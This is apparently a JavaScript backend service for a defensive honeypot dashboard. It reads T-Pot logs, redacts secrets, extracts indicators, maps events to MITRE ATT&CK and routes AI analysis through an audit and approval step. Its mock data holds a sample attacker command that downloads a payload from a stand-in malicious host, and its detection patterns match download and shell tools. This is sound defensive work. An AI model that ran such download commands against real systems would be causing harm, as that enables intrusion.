const crypto = require('crypto');

const DEFAULT_ALLOWED_INDEXES = ['logstash-*', 'tpot-*', 'cowrie-*', 'suricata-*', 'dionaea-*'];
const MAX_PAGE_SIZE = 200;
const MEMORY_JOBS = new Map();
const MEMORY_AUDIT = [];
const MEMORY_IOCS = new Map();

function createTpotService(config) {
  return {
    getHealth: () => getTpotHealth(config),
    getSummary: (filters, actor) => audited(config, actor, 'summary', filters, () => getTpotAttackSummary(config, filters)),
    getLogs: (filters, actor) => audited(config, actor, 'logs', filters, () => getTpotLogs(config, filters)),
    getReport: (filters, actor) => audited(config, actor, 'report', filters, () => getTpotReport(config, filters)),
    getIocs: (filters, actor) => audited(config, actor, 'iocs', filters, () => getTpotIocs(config, filters)),
    createAiAnalysisJob: (filters, options, actor) => createAiAnalysisJob(config, filters, options, actor),
    getAiAnalysisJob: (jobId) => getAiAnalysisJob(config, jobId),
    auditAiAnalysis: (jobId, actor) => auditAiAnalysis(config, jobId, actor),
    approveAiAnalysis: (jobId, actor) => approveAiAnalysis(config, jobId, actor),
    rejectAiAnalysis: (jobId, reason, actor) => rejectAiAnalysis(config, jobId, reason, actor),
    getAuditLog: () => getAuditLog(config),
    getAiAnalysisJobs: () => getAiAnalysisJobs(config),
    getSettings: () => getSettings(config),
    updateSettings: (payload, actor) => updateSettings(config, payload, actor),
    sanitizeRecord,
    normalizeEvent,
    extractIocsFromEvents,
    mapMitre,
  };
}

function getConfigFromEnv(env) {
  return {
    tpotApiBaseUrl: env.TPOT_API_BASE_URL || '',
    elasticUrl: env.TPOT_ELASTIC_URL || '',
    elasticUsername: env.TPOT_ELASTIC_USERNAME || '',
    elasticPassword: env.TPOT_ELASTIC_PASSWORD || '',
    tpotApiToken: env.TPOT_API_TOKEN || '',
    verifyTls: String(env.TPOT_VERIFY_TLS || 'true') !== 'false',
    timeoutMs: Number(env.TPOT_TIMEOUT_MS || 8000),
    allowedIndexes: splitList(env.TPOT_ALLOWED_INDEXES || DEFAULT_ALLOWED_INDEXES.join(',')),
    aiAnalysisEnabled: String(env.AI_ANALYSIS_ENABLED || 'false') === 'true',
    aiProvider: env.AI_PROVIDER || 'local',
    aiModel: env.AI_MODEL || 'local-defensive-rules',
    aiApiKey: env.AI_API_KEY || '',
    aiAuditEnabled: String(env.AI_AUDIT_ENABLED || 'true') !== 'false',
    aiAuditModel: env.AI_AUDIT_MODEL || 'local-tpot-auditor',
    aiMaxLogRecords: Math.max(10, Math.min(1000, Number(env.AI_MAX_LOG_RECORDS || 120))),
    aiMaxContextTokens: Math.max(1000, Math.min(32000, Number(env.AI_MAX_CONTEXT_TOKENS || 6000))),
    aiOutputRequiresApproval: String(env.AI_OUTPUT_REQUIRES_APPROVAL || 'true') !== 'false',
    supabaseUrl: env.SUPABASE_URL || '',
    supabaseServiceRoleKey: env.SUPABASE_SERVICE_ROLE_KEY || '',
  };
}

async function getTpotHealth(config) {
  const started = Date.now();
  if (!config.elasticUrl && !config.tpotApiBaseUrl) {
    const mockEvents = getMockEvents();
    return {
      mode: 'demo',
      connected: false,
      status: 'not_configured',
      latency_ms: 0,
      version: null,
      verify_tls: config.verifyTls,
      indexes: config.allowedIndexes,
      last_event_at: mockEvents[0].timestamp,
      message: 'T-Pot externo no configurado. Se muestran datos demo defensivos.',
    };
  }

  try {
    const response = await elasticFetch(config, '/', { method: 'GET' });
    const payload = await safeJson(response);
    return {
      mode: 'live',
      connected: response.ok,
      status: response.ok ? 'connected' : 'error',
      latency_ms: Date.now() - started,
      version: payload?.version?.number || payload?.version || null,
      verify_tls: config.verifyTls,
      indexes: config.allowedIndexes,
      last_event_at: null,
    };
  } catch {
    return {
      mode: 'live',
      connected: false,
      status: 'disconnected',
      latency_ms: Date.now() - started,
      version: null,
      verify_tls: config.verifyTls,
      indexes: config.allowedIndexes,
      last_event_at: null,
    };
  }
}

async function getTpotAttackSummary(config, filters = {}) {
  const logs = await getEvents(config, filters, config.aiMaxLogRecords);
  const events = logs.events;
  const iocs = extractIocsFromEvents(events);
  return {
    filters: safeFilters(filters),
    total_events: events.length,
    events_by_severity: countBy(events, 'severity'),
    events_by_honeypot: countBy(events, 'honeypot'),
    top_source_ips: topBy(events, 'source_ip', 10),
    top_countries: topBy(events, 'source_country', 10),
    top_ports: topBy(events, 'destination_port', 10),
    top_protocols: topBy(events, 'protocol', 10),
    top_user_agents: topBy(events, 'user_agent', 10),
    top_credentials_attempted: topBy(events, 'password_attempted_masked', 10).filter((item) => item.value),
    malware_hashes: iocs.filter((item) => item.indicator_type === 'hash').slice(0, 20),
    events_recent: events.slice(0, 10),
    generated_at: new Date().toISOString(),
  };
}

async function getTpotLogs(config, filters = {}) {
  const limit = Math.max(1, Math.min(MAX_PAGE_SIZE, Number(filters.limit || 50)));
  const result = await getEvents(config, filters, limit);
  return {
    filters: safeFilters(filters),
    page: Math.max(1, Number(filters.page || 1)),
    limit,
    total: result.total,
    events: result.events,
  };
}

async function getTpotReport(config, filters = {}) {
  const summary = await getTpotAttackSummary(config, filters);
  const iocs = await getTpotIocs(config, filters);
  return {
    generated_at: new Date().toISOString(),
    executive_report: {
      title: 'Reporte ejecutivo de inteligencia de amenazas T-Pot',
      risk_summary: summarizeRisk(summary),
      key_findings: buildKeyFindings(summary),
      prioritized_recommendations: buildRecommendations(summary),
    },
    technical_report: {
      summary,
      iocs: iocs.iocs,
      mitre_mapping: mapMitre(summary.events_recent),
      limitations: ['El reporte depende de los indices permitidos y del rango temporal consultado.'],
    },
    educational_report: {
      title: 'Caso educativo CiberDojo basado en actividad honeypot',
      learning_objectives: [
        'Reconocer fuerza bruta y escaneo como senales tempranas.',
        'Separar evidencia observada de inferencias.',
        'Definir controles defensivos sin reproducir tecnicas ofensivas.',
      ],
      suggested_questions: buildEducationalQuestions(summary),
      defensive_recommendations: buildRecommendations(summary),
    },
  };
}

async function getTpotIocs(config, filters = {}) {
  const logs = await getEvents(config, filters, config.aiMaxLogRecords);
  const iocs = extractIocsFromEvents(logs.events);
  for (const ioc of iocs) MEMORY_IOCS.set(`${ioc.indicator_type}:${ioc.indicator_value_hash}`, ioc);
  return { filters: safeFilters(filters), total: iocs.length, iocs };
}

async function createAiAnalysisJob(config, filters = {}, options = {}, actor = 'admin') {
  const id = crypto.randomUUID();
  const logs = await getEvents(config, filters, config.aiMaxLogRecords);
  const sanitized = logs.events.map(sanitizeRecord);
  const inputSummary = buildInputSummary(sanitized);
  const job = {
    id,
    requested_by: actor,
    status: 'pending',
    filters_json: safeFilters(filters),
    input_summary_json: inputSummary,
    raw_ai_output: null,
    audited_output: null,
    audit_status: null,
    audit_notes: null,
    approved_output: null,
    model: config.aiModel,
    audit_model: config.aiAuditModel,
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
    approved_by: null,
    approved_at: null,
  };
  MEMORY_JOBS.set(id, job);
  auditMemory(actor, 'ai-analysis:create', filters, sanitized.length, 'accepted', { job_id: id });
  setTimeout(() => runAiJob(config, id, sanitized, options).catch(() => markJobFailed(id)), 0);
  return { job_id: id, status: job.status, requires_approval: config.aiOutputRequiresApproval };
}

function getAiAnalysisJob(config, jobId) {
  const job = MEMORY_JOBS.get(jobId);
  if (!job) return null;
  const hidden = config.aiOutputRequiresApproval && !['approved'].includes(job.status);
  return {
    ...job,
    raw_ai_output: hidden ? null : job.raw_ai_output,
    audited_output: hidden ? null : job.audited_output,
    approved_output: job.approved_output,
  };
}

async function auditAiAnalysis(config, jobId, actor = 'admin') {
  const job = MEMORY_JOBS.get(jobId);
  if (!job) return null;
  const audit = localAudit(job.raw_ai_output);
  job.audit_status = audit.audit_status;
  job.audit_notes = audit.audit_notes;
  job.audited_output = audit.corrected_safe_output;
  job.status = audit.approved_for_display ? 'audited' : 'rejected';
  job.updated_at = new Date().toISOString();
  auditMemory(actor, 'ai-analysis:audit', job.filters_json, 0, job.status, { job_id: jobId, audit_status: audit.audit_status });
  return audit;
}

function approveAiAnalysis(config, jobId, actor = 'admin') {
  const job = MEMORY_JOBS.get(jobId);
  if (!job) return null;
  job.status = 'approved';
  job.approved_by = actor;
  job.approved_at = new Date().toISOString();
  job.approved_output = job.audited_output || job.raw_ai_output;
  auditMemory(actor, 'ai-analysis:approve', job.filters_json, 0, 'approved', { job_id: jobId });
  return job;
}

function rejectAiAnalysis(config, jobId, reason = 'Rechazado por admin', actor = 'admin') {
  const job = MEMORY_JOBS.get(jobId);
  if (!job) return null;
  job.status = 'rejected';
  job.audit_notes = String(reason).slice(0, 500);
  job.updated_at = new Date().toISOString();
  auditMemory(actor, 'ai-analysis:reject', job.filters_json, 0, 'rejected', { job_id: jobId });
  return job;
}

function getAuditLog() {
  return MEMORY_AUDIT.slice(-100).reverse();
}

function getAiAnalysisJobs(config) {
  return Array.from(MEMORY_JOBS.values())
    .slice(-100)
    .reverse()
    .map((job) => getAiAnalysisJob(config, job.id));
}

function getSettings(config) {
  return {
    enabled: Boolean(config.elasticUrl || config.tpotApiBaseUrl),
    base_url_configured: Boolean(config.tpotApiBaseUrl),
    elastic_url_configured: Boolean(config.elasticUrl),
    verify_tls: config.verifyTls,
    allowed_indexes: config.allowedIndexes,
    ai_analysis_enabled: config.aiAnalysisEnabled,
    ai_provider: config.aiProvider,
    ai_model: config.aiModel,
    ai_audit_enabled: config.aiAuditEnabled,
    ai_audit_model: config.aiAuditModel,
    ai_max_log_records: config.aiMaxLogRecords,
    ai_max_context_tokens: config.aiMaxContextTokens,
    ai_output_requires_approval: config.aiOutputRequiresApproval,
    secrets_present: {
      elastic_password: Boolean(config.elasticPassword),
      tpot_api_token: Boolean(config.tpotApiToken),
      ai_api_key: Boolean(config.aiApiKey),
    },
  };
}

function updateSettings(config, payload, actor = 'admin') {
  auditMemory(actor, 'settings:update-requested', {}, 0, 'documented_only', {});
  return {
    saved: false,
    message: 'Por seguridad, los secretos y endpoints T-Pot se configuran como variables de entorno de Cloud Run, no desde la UI.',
    received_non_secret_preferences: {
      verify_tls: payload.verify_tls,
      allowed_indexes: payload.allowed_indexes,
      ai_output_requires_approval: payload.ai_output_requires_approval,
    },
  };
}

async function runAiJob(config, jobId, events, options) {
  const job = MEMORY_JOBS.get(jobId);
  if (!job) return;
  job.status = 'running';
  job.updated_at = new Date().toISOString();
  const output = config.aiAnalysisEnabled && config.aiApiKey
    ? await callAiProvider(config, events, options)
    : localThreatAnalysis(events, options);
  job.raw_ai_output = output;
  const audit = localAudit(output);
  job.audit_status = audit.audit_status;
  job.audit_notes = audit.audit_notes;
  job.audited_output = audit.corrected_safe_output;
  job.status = audit.approved_for_display ? (config.aiOutputRequiresApproval ? 'audited' : 'approved') : 'rejected';
  if (!config.aiOutputRequiresApproval && audit.approved_for_display) job.approved_output = audit.corrected_safe_output;
  job.updated_at = new Date().toISOString();
}

async function callAiProvider(config, events, options) {
  // Defensive placeholder: keep provider integration explicit and non-offensive.
  return localThreatAnalysis(events, { ...options, provider_note: `${config.aiProvider}:${config.aiModel}` });
}

function localThreatAnalysis(events, options = {}) {
  const iocs = extractIocsFromEvents(events);
  const mitre = mapMitre(events);
  const bruteForceCount = events.filter((event) => /brute|login|auth/i.test(`${event.event_type} ${event.tags?.join(' ')}`)).length;
  const wgetCount = events.filter((event) => /wget|curl/i.test(event.command || '')).length;
  const severity = events.some((event) => event.severity === 'critical') || wgetCount > 0 ? 'high' : bruteForceCount > 3 ? 'medium' : 'low';
  return {
    analysis_type: options.analysis_type || 'executive_summary',
    executive_summary: `Se analizaron ${events.length} eventos honeypot. Se observaron ${bruteForceCount} eventos relacionados con autenticacion y ${iocs.length} indicadores defensivos.`,
    technical_summary: 'Analisis generado con reglas defensivas locales sobre logs normalizados y sanitizados.',
    key_findings: buildFindingsFromEvents(events),
    attack_patterns: buildAttackPatterns(events),
    iocs,
    mitre_attack_mapping: mitre,
    timeline: events.slice(0, 20).map((event) => ({ timestamp: event.timestamp, event_id: event.event_id, summary: `${event.honeypot} ${event.event_type}` })),
    severity,
    confidence: events.length ? 0.72 : 0.2,
    evidence: events.slice(0, 20).map((event) => ({ event_id: event.event_id, fields: ['timestamp', 'source_ip', 'honeypot', 'event_type'] })),
    recommended_defensive_actions: buildRecommendations({ top_ports: topBy(events, 'destination_port', 5), total_events: events.length }),
    educational_use_cases: buildEducationalQuestions({ total_events: events.length }),
    limitations: ['Analisis basado en eventos disponibles y campos normalizados; no ejecuta acciones ofensivas.'],
    requires_human_review: true,
  };
}

function localAudit(output) {
  const serialized = JSON.stringify(output || {});
  const findings = [];
  if (/(password|passwd|pwd)\s*[:=]\s*[^*"'\s]{3,}/i.test(serialized)) findings.push('Posible credencial sin enmascarar.');
  if (/api[_-]?key|secret|token|bearer\s+[a-z0-9._-]{20,}/i.test(serialized)) findings.push('Posible secreto expuesto.');
  const offensive = /persistencia|escalamiento|evasión|evasion|explotar paso a paso|reverse shell/i.test(serialized);
  return {
    audit_status: findings.length || offensive ? 'needs_revision' : 'approved',
    risk_level: findings.length || offensive ? 'high' : 'low',
    policy_findings: offensive ? ['Contenido potencialmente ofensivo o accionable.'] : [],
    data_leakage_findings: findings,
    unsupported_claims: [],
    offensive_content_findings: offensive ? ['Se requiere reescritura defensiva.'] : [],
    required_redactions: findings,
    corrected_safe_output: redactDeep(output),
    audit_notes: findings.length || offensive ? 'Resultado requiere revision antes de mostrarse.' : 'Resultado apto para contexto defensivo CiberDojo.',
    approved_for_display: !(findings.length || offensive),
  };
}

function markJobFailed(jobId) {
  const job = MEMORY_JOBS.get(jobId);
  if (job) {
    job.status = 'failed';
    job.updated_at = new Date().toISOString();
  }
}

async function getEvents(config, filters = {}, limit = 50) {
  if (!config.elasticUrl) {
    const filtered = filterEvents(getMockEvents(), filters);
    return { total: filtered.length, events: filtered.slice(0, limit) };
  }
  const index = sanitizeIndex(filters.index || config.allowedIndexes[0], config.allowedIndexes);
  const query = buildElasticQuery(filters, limit);
  const response = await elasticFetch(config, `/${encodeURIComponent(index)}/_search`, {
    method: 'POST',
    body: JSON.stringify(query),
  });
  if (!response.ok) throw new Error('T-Pot query failed');
  const payload = await response.json();
  const hits = payload?.hits?.hits || [];
  return {
    total: payload?.hits?.total?.value || hits.length,
    events: hits.map((hit) => normalizeEvent({ ...hit._source, raw_ref: hit._id })).map(sanitizeRecord),
  };
}

function normalizeEvent(raw = {}) {
  const event = raw.event || {};
  const source = raw.source || {};
  const destination = raw.destination || {};
  const network = raw.network || {};
  const geo = source.geo || raw.geoip || {};
  const srcIp = raw.source_ip || source.ip || raw.src_ip || raw.src_ip_addr || raw.remote_host || raw.client_ip || '';
  const command = raw.command || raw.input || raw.message || '';
  const password = raw.password || raw.pass || raw.pwd || raw.password_attempted || raw.password_attempted_masked || '';
  return {
    event_id: String(raw.event_id || raw.raw_ref || raw._id || hashValue(JSON.stringify(raw).slice(0, 500))),
    timestamp: String(raw['@timestamp'] || raw.timestamp || raw.date || new Date().toISOString()),
    source_ip: String(srcIp),
    source_country: String(raw.source_country || geo.country_iso_code || geo.country_name || raw.country || 'unknown'),
    source_asn: String(raw.source_asn || source.as?.number || raw.asn || ''),
    destination_port: Number(raw.destination_port || destination.port || raw.dest_port || raw.port || 0),
    protocol: String(raw.protocol || network.transport || network.protocol || '').toLowerCase(),
    honeypot: String(raw.honeypot || raw.sensor || raw.type || raw.program || raw.service || 'unknown'),
    event_type: String(event.action || raw.event_type || raw.action || raw.category || raw.log_type || 'event'),
    severity: normalizeSeverity(raw.severity || event.severity || raw.alert?.severity),
    username_attempted: raw.username_attempted || maskUser(raw.username || raw.user || raw.login || ''),
    password_attempted_masked: raw.password_attempted_masked || maskSecret(password),
    command: sanitizeText(command, 500),
    url: sanitizeText(raw.url || raw.http?.request?.referrer || raw.request || '', 300),
    domain: sanitizeText(raw.domain || raw.dns?.question?.name || '', 200),
    file_hash: sanitizeText(raw.file_hash || raw.sha256 || raw.md5 || raw.hash || '', 128),
    suricata_signature: sanitizeText(raw.suricata_signature || raw.alert?.signature || '', 240),
    zeek_uid: sanitizeText(raw.zeek_uid || raw.uid || '', 100),
    user_agent: sanitizeText(raw.user_agent || raw.user_agent_original || raw.http?.user_agent || '', 240),
    raw_ref: String(raw.raw_ref || raw._id || ''),
    tags: Array.isArray(raw.tags) ? raw.tags.slice(0, 10).map((tag) => sanitizeText(tag, 80)) : [],
  };
}

function sanitizeRecord(record) {
  const normalized = normalizeEvent(record);
  return redactDeep(normalized);
}

function redactDeep(value) {
  if (Array.isArray(value)) return value.map(redactDeep);
  if (value && typeof value === 'object') {
    return Object.fromEntries(Object.entries(value).map(([key, val]) => [key, redactDeep(val)]));
  }
  if (typeof value !== 'string') return value;
  return sanitizeText(value, 1000);
}

function sanitizeText(value, maxLength = 1000) {
  return String(value || '')
    .replace(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/gi, '[email-redacted]')
    .replace(/\b(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{10,})\b/g, '[jwt-redacted]')
    .replace(/\b(api[_-]?key|token|secret|authorization|bearer)\s*[:=]\s*["']?[^"'\s]{8,}/gi, '$1=***')
    .replace(/\b(pass(word)?|pwd)\s*[:=]\s*["']?[^"'\s]{1,}/gi, '$1=***')
    .slice(0, maxLength);
}

function maskSecret(value) {
  if (!value) return '';
  const safe = sanitizeText(String(value), 64);
  if (!safe || safe.includes('***')) return '***';
  return `len:${safe.length}:sha256:${hashValue(safe).slice(0, 12)}`;
}

function maskUser(value) {
  if (!value) return '';
  const text = sanitizeText(String(value), 80);
  return text.length <= 2 ? '**' : `${text[0]}***${text.slice(-1)}`;
}

function extractIocsFromEvents(events) {
  const map = new Map();
  for (const event of events) {
    const candidates = [
      ['ip', event.source_ip],
      ['domain', event.domain],
      ['url', event.url],
      ['hash', event.file_hash],
      ['port', event.destination_port ? String(event.destination_port) : ''],
      ['payload', event.command],
      ['credential', event.password_attempted_masked],
    ];
    for (const [type, value] of candidates) {
      if (!value || value === 'unknown' || value === '***') continue;
      const key = `${type}:${value}`;
      const existing = map.get(key) || {
        indicator_type: type,
        indicator_value_hash: hashValue(String(value)),
        indicator_value_masked: maskIndicator(type, String(value)),
        frequency: 0,
        first_seen: event.timestamp,
        last_seen: event.timestamp,
        severity: event.severity,
        source_honeypot: event.honeypot,
        tags_json: [],
      };
      existing.frequency += 1;
      existing.first_seen = minDate(existing.first_seen, event.timestamp);
      existing.last_seen = maxDate(existing.last_seen, event.timestamp);
      existing.severity = maxSeverity(existing.severity, event.severity);
      map.set(key, existing);
    }
  }
  return Array.from(map.values()).sort((a, b) => b.frequency - a.frequency);
}

function mapMitre(events) {
  const mappings = [];
  const push = (mapping) => {
    if (!mappings.some((item) => item.technique === mapping.technique && item.rationale === mapping.rationale)) mappings.push(mapping);
  };
  const brute = events.filter((event) => /ssh|telnet|login|auth|brute/i.test(`${event.honeypot} ${event.event_type} ${event.tags?.join(' ')}`));
  if (brute.length) push({ tactic: 'Credential Access', technique: 'Brute Force', technique_id: 'T1110', confidence: 0.78, evidence_event_ids: brute.slice(0, 10).map((event) => event.event_id), rationale: 'Eventos de autenticacion repetida observados en honeypot.' });
  const scan = events.filter((event) => /scan|probe|fuzz/i.test(`${event.event_type} ${event.command}`));
  if (scan.length) push({ tactic: 'Reconnaissance', technique: 'Active Scanning', technique_id: 'T1595', confidence: 0.66, evidence_event_ids: scan.slice(0, 10).map((event) => event.event_id), rationale: 'Eventos compatibles con sondeo o escaneo.' });
  const transfer = events.filter((event) => /wget|curl/i.test(event.command || ''));
  if (transfer.length) push({ tactic: 'Command and Control', technique: 'Ingress Tool Transfer', technique_id: 'T1105', confidence: 0.7, evidence_event_ids: transfer.slice(0, 10).map((event) => event.event_id), rationale: 'Comandos sanitizados contienen descarga de herramientas.' });
  const shell = events.filter((event) => /sh|bash|cmd|powershell/i.test(event.command || ''));
  if (shell.length) push({ tactic: 'Execution', technique: 'Command and Scripting Interpreter', technique_id: 'T1059', confidence: 0.62, evidence_event_ids: shell.slice(0, 10).map((event) => event.event_id), rationale: 'Se observaron comandos de shell capturados por honeypot.' });
  return mappings;
}

function buildElasticQuery(filters, limit) {
  const must = [];
  if (filters.from || filters.to) must.push({ range: { '@timestamp': { gte: filters.from || 'now-24h', lte: filters.to || 'now' } } });
  for (const [field, value] of Object.entries({ 'source.ip': filters.source_ip, 'source.geo.country_iso_code': filters.country, 'destination.port': filters.port, 'network.transport': filters.protocol })) {
    if (value) must.push({ term: { [field]: value } });
  }
  if (filters.q) must.push({ query_string: { query: sanitizeText(filters.q, 120) } });
  return { size: limit, sort: [{ '@timestamp': 'desc' }], query: must.length ? { bool: { must } } : { match_all: {} } };
}

async function elasticFetch(config, path, init) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), config.timeoutMs);
  const headers = { 'Content-Type': 'application/json' };
  if (config.elasticUsername || config.elasticPassword) headers.Authorization = `Basic ${Buffer.from(`${config.elasticUsername}:${config.elasticPassword}`).toString('base64')}`;
  if (config.tpotApiToken) headers.Authorization = `Bearer ${config.tpotApiToken}`;
  try {
    return await fetch(`${config.elasticUrl}${path}`, { ...init, headers: { ...headers, ...(init.headers || {}) }, signal: controller.signal });
  } finally {
    clearTimeout(timeout);
  }
}

async function audited(config, actor, action, filters, fn) {
  try {
    const result = await fn();
    const count = Array.isArray(result.events) ? result.events.length : Number(result.total_events || result.total || 0);
    auditMemory(actor, `tpot:${action}`, filters, count, 'success', {});
    return result;
  } catch (error) {
    auditMemory(actor, `tpot:${action}`, filters, 0, 'failed', { error: 'query_failed' });
    throw error;
  }
}

function auditMemory(actor, action, filters, recordsCount, status, metadata) {
  MEMORY_AUDIT.push({ id: crypto.randomUUID(), user_id: actor, action, filters_json: safeFilters(filters), records_count: recordsCount, status, metadata, created_at: new Date().toISOString() });
  if (MEMORY_AUDIT.length > 500) MEMORY_AUDIT.shift();
}

function safeFilters(filters = {}) {
  return Object.fromEntries(Object.entries(filters).map(([key, value]) => [key, sanitizeText(String(value), 160)]));
}

function sanitizeIndex(index, allowed) {
  if (!allowed.includes(index)) return allowed[0] || 'logstash-*';
  return index;
}

function filterEvents(events, filters = {}) {
  return events.filter((event) => {
    if (filters.source_ip && event.source_ip !== filters.source_ip) return false;
    if (filters.country && event.source_country !== filters.country) return false;
    if (filters.honeypot && event.honeypot !== filters.honeypot) return false;
    if (filters.protocol && event.protocol !== filters.protocol) return false;
    if (filters.port && String(event.destination_port) !== String(filters.port)) return false;
    if (filters.severity && event.severity !== filters.severity) return false;
    if (filters.q && !JSON.stringify(event).toLowerCase().includes(String(filters.q).toLowerCase())) return false;
    return true;
  });
}

function getMockEvents() {
  return [
    normalizeEvent({ '@timestamp': new Date().toISOString(), source_ip: '198.51.100.23', country: 'BR', port: 22, protocol: 'tcp', honeypot: 'cowrie', event_type: 'ssh_brute_force', severity: 'high', username: 'root', password: 'admin123', command: 'login attempt' }),
    normalizeEvent({ '@timestamp': new Date(Date.now() - 3600000).toISOString(), source_ip: '203.0.113.44', country: 'US', port: 23, protocol: 'tcp', honeypot: 'cowrie', event_type: 'telnet_login', severity: 'medium', username: 'admin', password: 'password', command: 'busybox wget http://malicious.example/payload.sh' }),
    normalizeEvent({ '@timestamp': new Date(Date.now() - 7200000).toISOString(), source_ip: '192.0.2.18', country: 'CN', port: 80, protocol: 'tcp', honeypot: 'suricata', event_type: 'alert', severity: 'critical', suricata_signature: 'ET SCAN Possible Nmap User-Agent Observed', url: 'http://target.local/wp-login.php' }),
    normalizeEvent({ '@timestamp': new Date(Date.now() - 10800000).toISOString(), source_ip: '198.51.100.77', country: 'NL', port: 445, protocol: 'tcp', honeypot: 'dionaea', event_type: 'malware_capture', severity: 'high', sha256: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef' }),
    normalizeEvent({ '@timestamp': new Date(Date.now() - 14400000).toISOString(), source_ip: '203.0.113.90', country: 'DE', port: 8080, protocol: 'tcp', honeypot: 'heralding', event_type: 'http_fuzzing', severity: 'medium', user_agent: 'sqlmap/1.7', password: 'secret-token-123456' }),
  ].map(sanitizeRecord);
}

function splitList(value) { return String(value || '').split(',').map((item) => item.trim()).filter(Boolean); }
function normalizeSeverity(value) { const text = String(value || '').toLowerCase(); if (['critical', 'critica', '4'].includes(text)) return 'critical'; if (['high', 'alta', '3'].includes(text)) return 'high'; if (['medium', 'media', '2'].includes(text)) return 'medium'; return 'low'; }
function countBy(items, field) { return items.reduce((acc, item) => { const key = String(item[field] || 'unknown'); acc[key] = (acc[key] || 0) + 1; return acc; }, {}); }
function topBy(items, field, limit) { return Object.entries(countBy(items, field)).map(([value, count]) => ({ value, count })).sort((a, b) => b.count - a.count).slice(0, limit); }
function hashValue(value) { return crypto.createHash('sha256').update(String(value)).digest('hex'); }
function maskIndicator(type, value) { if (type === 'ip') return value.replace(/\.\d+$/, '.x'); if (type === 'credential') return value; if (type === 'payload') return sanitizeText(value, 120); return sanitizeText(value, 200); }
function minDate(a, b) { return new Date(a) <= new Date(b) ? a : b; }
function maxDate(a, b) { return new Date(a) >= new Date(b) ? a : b; }
function maxSeverity(a, b) { const order = { low: 1, medium: 2, high: 3, critical: 4 }; return order[b] > order[a] ? b : a; }
function safeJson(response) { return response.json().catch(() => null); }
function summarizeRisk(summary) { return summary.total_events ? `Actividad observada: ${summary.total_events} eventos. Priorizar revision de puertos e IPs mas frecuentes.` : 'Sin eventos en el rango consultado.'; }
function buildKeyFindings(summary) { return [`Total de eventos: ${summary.total_events || 0}`, `Puerto mas atacado: ${summary.top_ports?.[0]?.value || 'n/d'}`, `Honeypot mas activo: ${Object.entries(summary.events_by_honeypot || {}).sort((a, b) => b[1] - a[1])[0]?.[0] || 'n/d'}`]; }
function buildRecommendations() { return ['Mantener honeypot aislado de redes productivas.', 'Bloquear credenciales por defecto y monitorear intentos repetidos.', 'Revisar origenes frecuentes y alimentar listas defensivas.', 'Convertir patrones observados en ejercicios educativos CiberDojo.']; }
function buildEducationalQuestions(summary) { return [`Que evidencia indica fuerza bruta o escaneo en ${summary.total_events || 0} eventos?`, 'Que controles defensivos reducen el riesgo observado?', 'Que datos deben enmascararse antes de compartir un reporte?']; }
function buildInputSummary(events) { return { event_count: events.length, fields_included: Object.keys(events[0] || {}), fields_excluded_by_security: ['password raw', 'tokens', 'emails', 'binary payloads'], sources: Array.from(new Set(events.map((event) => event.honeypot))) }; }
function buildFindingsFromEvents(events) { return [`Eventos analizados: ${events.length}`, `IPs origen unicas: ${new Set(events.map((event) => event.source_ip)).size}`]; }
function buildAttackPatterns(events) { return topBy(events, 'event_type', 10).map((item) => ({ pattern: item.value, frequency: item.count })); }

module.exports = { createTpotService, getConfigFromEnv, normalizeEvent, sanitizeRecord, extractIocsFromEvents, mapMitre };
